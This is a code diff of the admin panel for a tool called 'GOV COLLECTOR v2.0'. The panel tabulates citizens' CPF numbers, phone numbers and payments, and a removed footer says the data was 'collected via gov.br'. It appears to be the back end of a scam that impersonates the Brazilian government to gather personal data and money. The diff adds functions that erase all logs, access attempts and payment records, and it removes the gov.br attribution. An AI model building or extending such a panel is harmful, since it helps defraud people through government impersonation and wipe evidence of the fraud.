@@ -915,54 +915,63 @@
             </div>
         </div>
 
-        <div id="tabPayments" class="tab-content">
-            <div class="section-card">
-                <div class="section-title">
-                    <span>LISTA DE PAGAMENTOS</span>
-                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-                        <div class="search-box">
-                            <i class="fas fa-search"></i>
-                            <input type="text" id="searchPayments" placeholder="Buscar CPF..." onkeyup="filterPayments()">
-                        </div>
-                        <button class="btn-clear" onclick="exportarPaymentsCSV()"><i class="fas fa-download"></i> CSV</button>
-                    </div>
+        <!-- Pagamentos Tab -->
+<div id="tabPayments" class="tab-content">
+    <div class="section-card">
+        <div class="section-title">
+            <span>LISTA DE PAGAMENTOS</span>
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <div class="search-box">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="searchPayments" placeholder="Buscar CPF..." onkeyup="filterPayments()">
                 </div>
-                <div class="table-wrapper">
-                    <table>
-                        <thead>
-                            <tr><th>ID</th><th>CPF</th><th>TELEFONE</th><th>Valor</th><th>Status</th><th>Transacao</th><th>Data Solicitacao</th><th>Data Pagamento</th></tr>
-                        </thead>
-                        <tbody id="paymentsTable"></tbody>
-                    </table>
-                </div>
+                <button class="btn-clear" onclick="exportarPaymentsCSV()"><i class="fas fa-download"></i> CSV</button>
+                <button class="btn-danger" onclick="limparPagamentos()"><i class="fas fa-trash"></i> LIMPAR PAGAMENTOS</button>
             </div>
         </div>
+        <div class="table-wrapper">
+            <table>
+                <thead>
+                    <tr><th>ID</th><th>CPF</th><th>TELEFONE</th><th>Valor</th><th>Status</th><th>Transacao</th><th>Data Solicitacao</th><th>Data Pagamento</th></tr>
+                </thead>
+                <tbody id="paymentsTable"></tbody>
+            </table>
+        </div>
+    </div>
+</div>
 
-        <div id="tabLogs" class="tab-content">
-            <div class="section-card">
-                <div class="section-title">
-                    HISTORICO COMPLETO
-                    <div class="search-box" style="width: auto;">
-                        <i class="fas fa-search"></i>
-                        <input type="text" id="searchLogs" placeholder="Buscar..." onkeyup="filterLogs()">
-                    </div>
+
+<div id="tabLogs" class="tab-content">
+    <div class="section-card">
+        <div class="section-title">
+            HISTORICO COMPLETO
+            <div style="display: flex; gap: 10px;">
+                <div class="search-box" style="width: auto;">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="searchLogs" placeholder="Buscar..." onkeyup="filterLogs()">
                 </div>
-                <div id="logsList"></div>
+                <button class="btn-danger" onclick="limparLogs()" style="background: rgba(239,68,68,0.2);"><i class="fas fa-trash"></i> LIMPAR LOGS</button>
             </div>
         </div>
+        <div id="logsList"></div>
+    </div>
+</div>
 
-        <div id="tabSecurity" class="tab-content">
-            <div class="section-card">
-                <div class="section-title">TENTATIVAS DE ACESSO AO ADMIN</div>
-                <div class="table-wrapper">
-                    <tr>
-                        <thead><tr><th>IP</th><th>Tentativa</th><th>Data</th></tr></thead>
-                        <tbody id="tentativasTable"></tbody>
-                    </table>
-                </div>
-            </div>
+    
+<div id="tabSecurity" class="tab-content">
+    <div class="section-card">
+        <div class="section-title">
+            TENTATIVAS DE ACESSO AO ADMIN
+            <button class="btn-danger" onclick="limparTentativas()" style="background: rgba(239,68,68,0.2);"><i class="fas fa-trash"></i> LIMPAR TENTATIVAS</button>
         </div>
-
+        <div class="table-wrapper">
+            <table>
+                <thead><tr><th>IP</th><th>Tentativa</th><th>Data</th></tr></thead>
+                <tbody id="tentativasTable"></tbody>
+            </table>
+        </div>
+    </div>
+</div>
         <div id="tabSettings" class="tab-content">
             <div class="section-card">
                 <div class="section-title">ALTERAR SENHA DO ADMIN</div>
@@ -976,13 +985,13 @@
             </div>
         </div>
 
-        <div class="footer">GOV COLLECTOR v2.0 | SECURE ADMIN SYSTEM - Dados coletados via gov.br</div>
+        <div class="footer">GOV COLLECTOR v2.0 | SECURE ADMIN SYSTEM</div>
     </main>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
-    // CANVAS 3D
+   
     const canvas = document.getElementById('bgCanvas');
     const scene = new THREE.Scene();
     const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
@@ -1040,7 +1049,7 @@
         renderer.setSize(window.innerWidth, window.innerHeight);
     });
 
-    // FUNCOES GERAIS
+   
     function toggleSidebar() {
         document.getElementById('sidebar').classList.toggle('open');
     }
@@ -1390,7 +1399,50 @@ Caso já tenha efetuado o pagamento, desconsidere esta mensagem.
         const filtered = allLogs.filter(l => (l.cpf || '').toLowerCase().includes(term) || (l.tipo || '').toLowerCase().includes(term));
         renderLogs(filtered);
     }
+    
+async function limparLogs() {
+    if (!confirm('ATENÇÃO! Isso vai apagar TODOS os logs de atividades. Continuar?')) return;
+    try {
+        await fetch('/api/admin/clear-logs', {
+            method: 'POST',
+            headers: { 'Authorization': `Bearer ${adminToken}` }
+        });
+        loadAllData();
+        showToast('Todos os logs foram removidos', 'success');
+    } catch (error) {
+        showToast('Erro ao limpar logs', 'error');
+    }
+}
 
+
+async function limparTentativas() {
+    if (!confirm('ATENÇÃO! Isso vai apagar TODAS as tentativas de acesso. Continuar?')) return;
+    try {
+        await fetch('/api/admin/clear-attempts', {
+            method: 'POST',
+            headers: { 'Authorization': `Bearer ${adminToken}` }
+        });
+        loadAllData();
+        showToast('Tentativas removidas', 'success');
+    } catch (error) {
+        showToast('Erro ao limpar tentativas', 'error');
+    }
+}
+
+
+async function limparPagamentos() {
+    if (!confirm('ATENÇÃO! Isso vai apagar TODOS os pagamentos. Continuar?')) return;
+    try {
+        await fetch('/api/admin/clear-payments', {
+            method: 'POST',
+            headers: { 'Authorization': `Bearer ${adminToken}` }
+        });
+        loadAllData();
+        showToast('Pagamentos removidos', 'success');
+    } catch (error) {
+        showToast('Erro ao limpar pagamentos', 'error');
+    }
+}
     async function deletarUsuario(cpf) {
         if (!confirm(`Tem certeza que deseja excluir o usuario ${formatarCPF(cpf)}?`)) return;
         try {
